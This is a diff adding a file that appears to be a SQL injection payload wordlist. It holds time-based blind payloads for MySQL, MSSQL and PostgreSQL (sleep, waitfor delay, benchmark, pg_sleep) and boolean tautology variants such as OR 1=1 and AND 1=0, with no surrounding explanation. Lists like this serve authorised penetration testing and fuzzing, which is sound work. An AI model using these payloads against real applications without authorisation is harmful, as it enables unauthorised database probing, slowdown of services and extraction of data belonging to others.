@@ -1,0 +1,150 @@
+ sleep(20)#
+ or sleep(20)#
+" or sleep(20)#
+' or sleep(20)#
+" or sleep(20)="
+' or sleep(20)='
+) or sleep(20)#
+") or sleep(20)="
+') or sleep(20)='
+)) or sleep(20)#
+")) or sleep(20)="
+')) or sleep(20)='
+;waitfor delay '0:0:20'--
+);waitfor delay '0:0:20'--
+';waitfor delay '0:0:20'--
+";waitfor delay '0:0:20'--
+');waitfor delay '0:0:20'--
+");waitfor delay '0:0:20'--
+));waitfor delay '0:0:20'--
+'));waitfor delay '0:0:20'--
+"));waitfor delay '0:0:20'--
+ benchmark(10000000,MD5(1))#
+ or benchmark(10000000,MD5(1))#
+" or benchmark(10000000,MD5(1))#
+' or benchmark(10000000,MD5(1))#
+) or benchmark(10000000,MD5(1))#
+") or benchmark(10000000,MD5(1))#
+') or benchmark(10000000,MD5(1))#
+)) or benchmark(10000000,MD5(1))#
+")) or benchmark(10000000,MD5(1))#
+')) or benchmark(10000000,MD5(1))#
+ pg_sleep(20)--
+ or pg_sleep(20)--
+" or pg_sleep(20)--
+' or pg_sleep(20)--
+) or pg_sleep(20)--
+") or pg_sleep(20)--
+') or pg_sleep(20)--
+)) or pg_sleep(20)--
+")) or pg_sleep(20)--
+')) or pg_sleep(20)--
+ AND (SELECT * FROM (SELECT(SLEEP(20)))bAKL) AND 'vRxe'='vRxe
+ AND (SELECT * FROM (SELECT(SLEEP(20)))YjoC) AND '%'='
+ AND (SELECT * FROM (SELECT(SLEEP(20)))nQIP)
+ AND (SELECT * FROM (SELECT(SLEEP(20)))nQIP)--
+ AND (SELECT * FROM (SELECT(SLEEP(20)))nQIP)#
+' AND (SELECT * FROM (SELECT(SLEEP(20)))bAKL) AND 'vRxe'='vRxe
+' AND (SELECT * FROM (SELECT(SLEEP(20)))YjoC) AND '%'='
+' AND (SELECT * FROM (SELECT(SLEEP(20)))nQIP)
+' AND (SELECT * FROM (SELECT(SLEEP(20)))nQIP)--
+' AND (SELECT * FROM (SELECT(SLEEP(20)))nQIP)#
+' oR SLEEP(20)#
+' oR SLEEP(20)--
+' oR SLEEP(20)="
+' oR SLEEP(20)='
+' AnD SLEEP(20)#
+' AnD SLEEP(20)--
+' AnD SLEEP(20)="
+' AnD SLEEP(20)='
+';waitfor delay '00:00:20'
+';waitfor delay '00:00:20'--
+';waitfor delay '00:00:20'#
+';benchmark(50000000,MD5(1))
+';benchmark(50000000,MD5(1))--
+';benchmark(50000000,MD5(1))#
+' or benchmark(50000000,MD5(1))
+' or benchmark(50000000,MD5(1))--
+' or benchmark(50000000,MD5(1))#
+';pg_SLEEP(20)
+';pg_SLEEP(20)--
+';pg_SLEEP(20)#
+' or pg_SLEEP(20)
+' or pg_SLEEP(20)--
+' or pg_SLEEP(20)#
+'\"
+' AnD SLEEP(20)
+' AnD SLEEP(20)--
+' AnD SLEEP(20)#
+' AnD SLEEP(20) ANd '1
+'&&SLEEP(20)&&'1
+' ORDER BY SLEEP(20)
+' ORDER BY SLEEP(20)--
+' ORDER BY SLEEP(20)#
+' + SLEEP(20) + '
+';SLEEP(20)/*' or SLEEP(20) or '" or SLEEP(20) or "*/
+' or "
+-- or # 
+' OR '1
+' OR 1 -- -
+" OR "" = "
+" OR 1 = 1 -- -
+' OR '' = '
+'='
+'LIKE'
+'=0--+
+ OR 1=1
+' OR 'x'='x
+' AND id IS NULL; --
+ AND 1
+ AND 0
+ AND true
+ AND false
+ OR 1=1
+ OR 1=0
+ OR x=x
+ OR x=y
+ OR 1=1#
+ OR 1=0#
+ OR x=x#
+ OR x=y#
+ OR 1=1-- 
+ OR 1=0-- 
+ OR x=x-- 
+ OR x=y-- 
+ OR 3409=3409 AND ('pytW' LIKE 'pytW
+ OR 3409=3409 AND ('pytW' LIKE 'pytY
+ HAVING 1=1
+ HAVING 1=0
+ HAVING 1=1#
+ HAVING 1=0#
+ HAVING 1=1-- 
+ HAVING 1=0-- 
+ AND 1=1
+ AND 1=0
+ AND 1=1-- 
+ AND 1=0-- 
+ AND 1=1#
+ AND 1=0#
+ AND 1=1 AND '%'='
+ AND 1=0 AND '%'='
+ AND 1083=1083 AND (1427=1427
+ AND 7506=9091 AND (5913=5913
+ AND 1083=1083 AND ('1427=1427
+ AND 7506=9091 AND ('5913=5913
+ AND 7300=7300 AND 'pKlZ'='pKlZ
+ AND 7300=7300 AND 'pKlZ'='pKlY
+ AND 7300=7300 AND ('pKlZ'='pKlZ
+ AND 7300=7300 AND ('pKlZ'='pKlY
+ AS INJECTX WHERE 1=1 AND 1=1
+ AS INJECTX WHERE 1=1 AND 1=0
+ AS INJECTX WHERE 1=1 AND 1=1#
+ AS INJECTX WHERE 1=1 AND 1=0#
+ AS INJECTX WHERE 1=1 AND 1=1--
+ AS INJECTX WHERE 1=1 AND 1=0--
+ WHERE 1=1 AND 1=1
+ WHERE 1=1 AND 1=0
+ WHERE 1=1 AND 1=1#
+ WHERE 1=1 AND 1=0#
+ WHERE 1=1 AND 1=1--
+ WHERE 1=1 AND 1=0--
